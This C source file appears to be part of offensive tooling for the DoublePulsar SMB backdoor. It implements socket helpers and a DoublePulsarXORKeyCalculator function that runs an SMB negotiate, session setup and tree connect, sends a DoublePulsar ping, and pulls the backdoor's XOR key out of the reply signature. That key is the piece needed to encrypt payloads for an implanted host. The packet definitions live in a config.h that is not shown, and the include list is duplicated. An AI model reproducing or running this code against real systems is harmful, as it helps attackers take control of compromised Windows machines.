#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <ctype.h>
#include <dirent.h>
#include <poll.h>
#include <pthread.h>
#include <math.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pwd.h>
#include <grp.h>
#include <utime.h>
#include <syslog.h>
#include <wchar.h>
#include "config.h"

#include <errno.h>
#include <stddef.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>

extern int smb_connect(const char *ip, int port);

static int
write_all(int fd, const unsigned char *buf, size_t len)
{
    size_t off = 0;

    while (off < len) {
        ssize_t n = send(fd, buf + off, len - off, 0);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (n == 0)
            return -1;
        off += (size_t)n;
    }
    return 0;
}

static int
read_all(int fd, unsigned char *buf, size_t len)
{
    size_t off = 0;

    while (off < len) {
        ssize_t n = recv(fd, buf + off, len - off, 0);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (n == 0)
            return -1;
        off += (size_t)n;
    }
    return 0;
}

static int
send_smb_packet(int fd, const unsigned char *packet, size_t available)
{
    size_t payload_len;
    size_t packet_len;

    if (available < 4)
        return -1;

    payload_len = ((size_t)packet[1] << 16) |
                  ((size_t)packet[2] << 8) |
                  (size_t)packet[3];
    packet_len = payload_len + 4;
    if (packet_len > available)
        return -1;

    return write_all(fd, packet, packet_len);
}

static int
read_smb_response(int fd, unsigned char **response, size_t *response_len)
{
    unsigned char header[4];
    unsigned char *buf;
    size_t payload_len;
    size_t total_len;

    if (read_all(fd, header, sizeof(header)) < 0)
        return -1;

    payload_len = ((size_t)header[1] << 16) |
                  ((size_t)header[2] << 8) |
                  (size_t)header[3];
    total_len = payload_len + sizeof(header);

    buf = malloc(total_len);
    if (buf == NULL)
        return -1;

    for (size_t i = 0; i < sizeof(header); ++i)
        buf[i] = header[i];

    if (read_all(fd, buf + sizeof(header), payload_len) < 0) {
        free(buf);
        return -1;
    }

    *response = buf;
    *response_len = total_len;
    return 0;
}

unsigned int
DoublePulsarXORKeyCalculator(const char *ip, int port)
{
    int fd;
    unsigned char *response = NULL;
    size_t response_len = 0;
    unsigned int key;

    fd = smb_connect(ip, port);
    if (fd < 0)
        return 0;

    if (send_smb_packet(fd, (const unsigned char *)SMB_NEGOTIATE_PKT,
                        sizeof(SMB_NEGOTIATE_PKT)) < 0 ||
        read_smb_response(fd, &response, &response_len) < 0)
        goto error;
    free(response);
    response = NULL;

    if (send_smb_packet(fd, (const unsigned char *)SMB_SESSION_SETUP_PKT,
                        sizeof(SMB_SESSION_SETUP_PKT)) < 0 ||
        read_smb_response(fd, &response, &response_len) < 0)
        goto error;
    free(response);
    response = NULL;

    if (send_smb_packet(fd, (const unsigned char *)SMB_TREE_CONNECT_PKT,
                        sizeof(SMB_TREE_CONNECT_PKT)) < 0 ||
        read_smb_response(fd, &response, &response_len) < 0)
        goto error;
    free(response);
    response = NULL;

    if (send_smb_packet(fd, (const unsigned char *)DP_PING_PKT,
                        sizeof(DP_PING_PKT)) < 0 ||
        read_smb_response(fd, &response, &response_len) < 0)
        goto error;

    if ((size_t)SMB_RESP_SIGNATURE_END > response_len ||
        (size_t)SMB_RESP_SIGNATURE_START > response_len ||
        response_len - (size_t)SMB_RESP_SIGNATURE_START < 4)
        goto error;

    key = ((unsigned int)response[SMB_RESP_SIGNATURE_START] << 24) |
          ((unsigned int)response[SMB_RESP_SIGNATURE_START + 1] << 16) |
          ((unsigned int)response[SMB_RESP_SIGNATURE_START + 2] << 8) |
          (unsigned int)response[SMB_RESP_SIGNATURE_START + 3];

    free(response);
    close(fd);
    return key;

error:
    free(response);
    close(fd);
    return 0;
}